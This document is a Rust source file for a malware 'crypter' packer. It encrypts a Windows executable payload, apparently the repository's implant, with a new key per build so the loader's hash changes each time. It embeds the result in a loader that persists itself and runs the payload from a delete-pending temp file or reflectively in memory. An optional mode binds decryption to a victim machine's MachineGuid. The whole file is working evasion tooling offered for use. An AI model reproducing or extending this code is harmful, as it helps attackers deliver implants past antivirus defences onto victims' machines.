//! Build-time packer: encrypts a PE payload with a fresh random key/nonce
//! and writes it into the loader crate as `payload.enc` + generated `gen.rs`.
//!
//!   crypter-packer <payload.exe> [out_dir] [--reflective]
//!
//! --reflective  : loader maps the PE in memory (no disk). NOTE: reflective
//!                 loading a Rust/tokio binary is TLS-unsound — prefer the
//!                 default temp-exec strategy for this repo's implant.
//! (default)     : loader persists itself + runs the decrypted payload from a
//!                 delete-pending %TEMP% file (OS loader => TLS/SEH correct).
//!
//! Re-run per build → new key, nonce, ciphertext and a different loader hash.

use std::path::{Path, PathBuf};

fn main() {
    let mut positional: Vec<String> = Vec::new();
    let mut reflective = false;
    let mut bind: Option<String> = None;
    let args: Vec<String> = std::env::args().skip(1).collect();
    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--reflective" => reflective = true,
            "--bind" => {
                i += 1;
                if i >= args.len() {
                    eprintln!("--bind requires a MachineGuid");
                    std::process::exit(2);
                }
                bind = Some(args[i].clone());
            }
            "-h" | "--help" => {
                eprintln!("usage: crypter-packer <payload.exe> [out_dir] [--reflective] [--bind <machine-guid>]");
                std::process::exit(0);
            }
            a if a.starts_with("--") => {
                eprintln!("unknown flag: {a}");
                std::process::exit(2);
            }
            _ => positional.push(args[i].clone()),
        }
        i += 1;
    }
    if positional.is_empty() {
        eprintln!("usage: crypter-packer <payload.exe> [out_dir] [--reflective] [--bind <machine-guid>]");
        std::process::exit(2);
    }

    let payload_path = Path::new(&positional[0]);
    let out_dir = PathBuf::from(
        positional
            .get(1)
            .cloned()
            .unwrap_or_else(|| "crypter/loader/src".to_string()),
    );

    let plain = std::fs::read(payload_path)
        .unwrap_or_else(|e| panic!("read {}: {e}", payload_path.display()));
    if plain.len() < 64 || &plain[..2] != b"MZ" {
        eprintln!(
            "[!] {} does not look like a PE ({} bytes) — packing anyway",
            payload_path.display(),
            plain.len()
        );
    }

    let mut nonce = [0u8; crypter_common::NONCE_LEN];
    getrandom::getrandom(&mut nonce).expect("OS RNG failed");
    let (key, secret, bound) = match &bind {
        Some(guid) => {
            let mut secret = [0u8; crypter_common::KEY_LEN];
            getrandom::getrandom(&mut secret).expect("OS RNG failed");
            (crypter_common::derive_key(&secret, guid), secret, true)
        }
        None => {
            let mut key = [0u8; crypter_common::KEY_LEN];
            getrandom::getrandom(&mut key).expect("OS RNG failed");
            (key, [0u8; crypter_common::KEY_LEN], false)
        }
    };

    // In bind mode the derived key must NOT be stored (otherwise the artifact
    // would run on any machine); KEY is zero and the loader derives it.
    let stored_key = if bound { [0u8; crypter_common::KEY_LEN] } else { key };
    let blob = crypter_common::encrypt(&plain, &key, &nonce);
    let check = crypter_common::decrypt(&blob, &key, &nonce)
        .expect("self-verify: could not decrypt freshly encrypted blob");
    assert_eq!(check, plain, "self-verify: decrypt mismatch");

    std::fs::create_dir_all(&out_dir).expect("create out_dir");
    let blob_path = out_dir.join("payload.enc");
    std::fs::write(&blob_path, &blob).expect("write payload.enc");

    let gen = format!(
        "// generated by crypter-packer — do not edit\n\
         pub const KEY: [u8; 32] = {stored_key:?};\n\
         pub const NONCE: [u8; 24] = {nonce:?};\n\
         pub const SECRET: [u8; 32] = {secret:?};\n\
         pub const BIND: bool = {bound};\n\
         pub const REFLECTIVE: bool = {reflective};\n\
         pub const BLOB: &[u8] = include_bytes!(\"payload.enc\");\n"
    );
    let gen_path = out_dir.join("gen.rs");
    std::fs::write(&gen_path, gen).expect("write gen.rs");

    println!("[+] payload   : {} ({} bytes)", payload_path.display(), plain.len());
    println!("[+] blob      : {} ({} bytes)", blob_path.display(), blob.len());
    println!("[+] gen       : {}", gen_path.display());
    println!(
        "[+] strategy  : {}",
        if reflective {
            "reflective (no disk; TLS-unsound for Rust/tokio)"
        } else {
            "temp-exec (reliable; delete-pending %TEMP%)"
        }
    );
    if let Some(guid) = &bind {
        println!("[+] bind      : MachineGuid {guid}");
    }
    if bound {
        println!("[+] key       : derived from MachineGuid (not stored)");
    } else {
        println!("[+] key       : {}", hex(&key));
    }
    println!("[+] nonce     : {}", hex(&nonce));
    println!("[+] build     : cargo build -p crypter-loader --release --target x86_64-pc-windows-gnu");
}

fn hex(b: &[u8]) -> String {
    let mut s = String::with_capacity(b.len() * 2);
    for x in b {
        s.push_str(&format!("{x:02x}"));
    }
    s
}
